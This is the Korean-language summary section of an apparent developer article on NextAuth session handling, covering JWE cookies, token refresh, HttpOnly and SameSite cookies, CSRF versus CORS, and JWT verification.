└─────────────────────────────────────────────┘
```

## 요약

- **NextAuth의 역할**은 "세션 관리 프록시"다. 인증 자체는 외부 백엔드 API가 담당하고, NextAuth는 백엔드에서 받은 토큰을 암호화된 쿠키(JWE)로 안전하게 저장한다
- **인증 흐름**은 `authorize()` → `jwt` 콜백 → `session` 콜백 순서로, 매 요청마다 토큰 만료를 체크하고 5분 버퍼로 선제적 갱신을 수행한다
- **`[...nextauth]`**는 Catch-All Dynamic Route로, `/api/auth/` 하위 모든 경로를 하나의 route.ts에서 처리한다
- **HttpOnly 쿠키**는 JavaScript에서 접근할 수 없어 XSS 공격에 의한 세션 탈취를 방지한다. `useSession()`은 쿠키를 직접 읽는 것이 아니라 서버에 HTTP 요청을 보내서 세션 정보를 받아온다
- **SameSite=Lax**는 다른 사이트에서의 POST 요청에 쿠키를 포함하지 않아 CSRF를 방어하면서도, 링크 클릭(GET) 시에는 쿠키를 전송하여 로그인 상태를 유지한다
- **CORS**는 `fetch()` + JSON 같은 "모던" 요청은 Preflight로 차단하지만, `<form>` 전송 같은 "클래식" 공격은 막지 못한다. 그래서 SameSite + CSRF 토큰이 추가로 필요하다
- **JWT 검증**은 서명 검증(위변조 확인)과 클레임 검증(만료/발급자 확인)으로 나뉜다. 프론트엔드는 백엔드 JWT의 서명을 검증하지 않고 payload만 참고용으로 읽는다
- **refreshToken**은 JWT 레이어에만 존재하고 Session에 포함하지 않는다. 클라이언트 코드에서는 접근할 수 없다
